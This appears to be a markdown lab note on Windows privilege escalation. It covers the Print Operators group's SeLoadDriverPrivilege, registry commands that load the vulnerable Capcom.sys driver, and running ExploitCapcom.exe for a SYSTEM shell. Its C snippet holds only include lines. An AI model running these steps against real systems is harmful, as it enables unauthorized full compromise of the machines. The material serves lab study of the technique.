## <span style="color:#8BE9FD">What is Print Operators (SeLoadDriverPrivilege)?</span>
A Windows group with high privileges, especially on Domain Controllers.

Members can:
- Load drivers (SeLoadDriverPrivilege)
- Shut down the system
- Log in to Domain Controllers

### <span style="color:#50FA7B">Step-by-Step Summary</span>
#### <span style="color:#FFB86C">1.  Confirm Privileges</span>
Use `whoami /priv` to check if `SeLoadDriverPrivilege` is enabled.

If not visible, you may need to bypass UAC or run an elevated shell.

#### <span style="color:#FFB86C">2.  Enable the Driver Privilege</span>
Compile and run `EnableSeLoadDriverPrivilege.cpp` (given in the lab).
`EnableSeLoadDriverPrivilege.cpp` code
```c
#include <windows.h>
#include <assert.h>
#include <winternl.h>
#include <sddl.h>
#include <stdio.h>
#include "tchar.h"
```
Compile with cl.exe
```cmd
cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
```

After running it, `SeLoadDriverPrivilege` will be visible and enabled.

#### <span style="color:#FFB86C">3.  Load the Vulnerable Driver (Capcom.sys)</span>
Download `Capcom.sys` to `C:\Tools`.
Use these commands to set up the registry:
```cmd
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"

reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
```
This tricks the system into loading the driver from a user registry path.
### <span style="color:#50FA7B">4.  Run the Exploit</span>
Run ExploitCapcom.exe.
It exploits the Capcom.sys driver to run shellcode and gives SYSTEM access.
You now get a SYSTEM shell, the highest privilege in Windows.
